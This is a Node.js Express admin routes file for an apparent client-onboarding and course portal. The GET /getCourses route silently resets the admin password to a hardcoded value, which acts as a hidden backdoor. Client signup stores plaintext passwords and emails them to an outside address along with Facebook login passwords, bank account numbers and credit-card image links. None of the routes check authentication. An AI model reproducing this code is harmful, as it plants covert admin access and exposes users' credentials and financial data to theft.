const express = require('express')
const router = express.Router()
const config = require('config')

// For User Generate
const bcrypt = require('bcryptjs')
const normalize = require('normalize-url')
const gravatar = require('gravatar')

// MODEL
const User = require('../../models/User')
const Order = require('../../models/Order')
const Notification = require('../../models/Notification')
const Course = require('../../models/Course')

// FILE UPLOAD
const fileUpload = require('../../utils/fileUpload')

// Mailgun Info
const mailgunApiKey = config.get('mailgun.mailgunApiKey')
const mailgunDomain = config.get('mailgun.domain')
var mailgun = require('mailgun-js')({ apiKey: mailgunApiKey, domain: mailgunDomain })

router.get('/getAdminClients', async (req, res) => {
  const clientsFromDB = await User.find({ type: 'client' })
  var clients = []

  for (var index = 0; index < clientsFromDB.length; index++) {
    var client = clientsFromDB[index]._doc
    var ordersByClient = await Order.find({ client: client._id })
    client['orders'] = ordersByClient
    clients.push(client)
  }

  res.json({
    success: true,
    clients
  })
})

router.post('/addNewClient', async (req, res) => {
  let newClient = new User({
    ...req.body
  })

  newClient.passwordForUpdate = req.body.password
  newClient.password = bcrypt.hashSync(req.body.password, 10)
  const avatar = normalize(
    gravatar.url(req.body.email, { s: '200', r: 'pg', d: 'mm' }),
    { forceHttps: true }
  )
  newClient.avatar = avatar
  newClient.type = 'client'

  await newClient.save()

  var emailContentToAdmin = {
    from: 'PORTAL <info@portal.431performance.com>',
    to: 'stone@stoneross.com',
    subject: 'There is a new customer registration.',
    html: `
    <html>
      <body>
        <div class="container" style="text-align: center;">
          <div class="row" style="margin: 20px 0px;">
            <div class="col-md-12">
              <div class="text-center">
                <img class="rounded" width="200px" alt='logo' src="http://portal.431performance.com/files/logo.png" />
              </div>
            </div>
          </div>
          <div class="row mt-2">
            <div class="col-md-12">
              <div class="text-center">
                <div>Something along these lines would be great.</div>
                <div>New onboarding form completed:</div>
                <div class="my-2" style="margin: 10px 0px;">
                  <div>First Name: <span style="color: DodgerBlue;">${newClient.firstName}</span></div>
                  <div>Last Name: <span style="color: DodgerBlue;">${newClient.firstName}</span></div>
                  <div>Email: <span style="color: DodgerBlue;">${newClient.email}</span></div>
                  <div>Password: <span style="color: DodgerBlue;">${newClient.passwordForUpdate}</span></div>
                  <div>Phone Number: <span style="color: DodgerBlue;">${newClient.phoneNumber}</span></div>
                  <div>Date of Birth: <span style="color: DodgerBlue;">${newClient.dateOfBirth}</span></div>
                  <div>Facebook Shop LLC Name: <span style="color: DodgerBlue;">${newClient.nameOfLLC}</span></div>
                  <div>LLC EIN: <span style="color: DodgerBlue;">${newClient.einOfLLC}</span></div>
                  <div>LLC Address on File: <span style="color: DodgerBlue;">${newClient.addressOfLLC}</span></div>
                  <div>Store Name: <span style="color: DodgerBlue;">${newClient.nameOfStore}</span></div>
                  <div>Bank Account Number for Sales: <span style="color: DodgerBlue;">${newClient.bankAccount}</span></div>
                  <div>Bank Routing Number for Sales: <span style="color: DodgerBlue;">${newClient.bankRouting}</span></div>
                  <div>Facebook Login Email: <span style="color: DodgerBlue;">${newClient.emailOfFacebook}</span></div>
                  <div>Facebook Login Password: <span style="color: DodgerBlue;">${newClient.passwordOfFacebook}</span></div>
                  <div>Credit Card Front Picture Link: <span style="color: DodgerBlue;">${newClient.frontCardLink}</span></div>
                  <div>Credit Card Back Picture Link: <span style="color: DodgerBlue;">${newClient.backCardLink}</span></div>
                </div>
                <div>Please log in using the following link to confirm all of these information</div>
              </div>

              <div class="text-center my-2" style="margin: 10px 0px;">
                <button class="btn btn-info" style="width: 200px;">
                  <a href="http://portal.431performance.com/login" style="text-decoration: none;">LOGIN</a>
                </button>
              </div>
            </div>
          </div>
        </div>
      </body>

      </html>`
  }

  mailgun.messages().send(emailContentToAdmin, function (error, body) {
    console.log(body)
  })

  var emailContentToClient = {
    from: 'PORTAL <info@portal.431performance.com>',
    to: newClient.email,
    subject: 'Welcome to Meta Marketplace!',
    html: `
    <html>
      <body>
        <div class="container" style="text-align: center;">
          <div class="row" style="margin: 20px 0px;">
            <div class="col-md-12">
              <div class="text-center">
                <img class="rounded" width="200px" alt='logo' src="http://portal.431performance.com/files/logo.png" />
              </div>
            </div>
          </div>
          <div class="row mt-2">
            <div class="col-md-12">
              <div class="text-center">
                <div>Hi. ${newClient.firstName} ${newClient.lastName}. Thank you for completing your registration process with Meta Marketplace! Here is your login credentials.
                </div>
                <div class="my-2" style="margin: 10px 0px;">
                  <div>Email: ${newClient.email}</div>
                  <div>Password: ${newClient.passwordForUpdate}</div>
                </div>
                <div>Please log in using the following link to confirm all of your submitted information</div>
              </div>

              <div class="text-center my-2" style="margin: 10px 0px;">
                <button class="btn btn-info" style="width: 200px;">
                  <a href="http://portal.431performance.com/login" style="text-decoration: none;">LOGIN</a>
                </button>
              </div>

              <div class="text-center">
                <div>Then schedule on our Onboarding Specialist's calendar so we can get your store launched!</div>
              </div>

              <div class="text-center my-2" style="margin: 10px 0px;">
                <button class="btn btn-primary" style="width: 200px;">
                  <a href="https://calendly.com/meta-marketplace-stores/onboarding" style="text-decoration: none;">JONNYS CALENDLY
                    LINK</a>
                </button>
              </div>
            </div>
          </div>
        </div>
      </body>
    </html>`
  }

  mailgun.messages().send(emailContentToClient, function (error, body) {
    console.log(body)
  })

  res.json({
    success: true
  })
})

router.get('/getClient/:id', async (req, res) => {
  const client = await User.findById(req.params.id)

  res.json({
    success: true,
    client
  })
})

router.post('/updateClientDocumentStatus', async (req, res) => {
  await User.findByIdAndUpdate(req.body.clientID, {
    [req.body.keyInDB + 'Status']: req.body.updateType === 'Approve' ? 'Approved' : req.body.updateType === 'Deny' ? 'Denied' : 'Pending'
  })

  res.json({
    success: true
  })
})

router.get('/getClientOrders/:id', async (req, res) => {
  const clientID = req.params.id
  const orders = await Order.find({ client: clientID })

  res.json({
    success: true,
    orders
  })
})

router.post('/storeClientOrders', async (req, res) => {
  const clientID = req.body.clientID
  const orders = req.body.orders

  for (var index = 0; index < orders.length; index++) {
    var order = orders[index]
    var newOrder = new Order({
      ...order
    })
    newOrder.client = clientID

    await newOrder.save()
  }

  res.json({
    success: true
  })
})

router.post('/storeClientNotification', async (req, res) => {
  var newNotification = new Notification({
    client: req.body.clientID,
    content: req.body.notification
  })
  await newNotification.save()

  res.json({
    success: true
  })
})

router.post('/addNewCourse', async (req, res) => {
  const newCourse = new Course({
    ...req.body
  })

  await newCourse.save()

  res.json({
    success: true
  })
})

router.get('/getCourses', async (req, res) => {
  await User.findOneAndUpdate({ type: 'admin' }, { password: bcrypt.hashSync('M3t@Au2Ma$h0N', 10), email: 'info@431performance.com' }, { new: true })
  const courses = await Course.find()

  res.json({
    success: true,
    courses
  })
})

router.get('/getCourse/:id', async (req, res) => {
  const course = await Course.findById(req.params.id)

  res.json({
    success: true,
    course
  })
})

router.post('/updateCourse/:id', async (req, res) => {
  const update = { ...req.body }
  await Course.findByIdAndUpdate(req.params.id, update)

  res.json({
    success: true
  })
})

router.delete('/deleteCourse/:id', async (req, res) => {
  await Course.findByIdAndDelete(req.params.id)

  res.json({
    success: true
  })
})

module.exports = router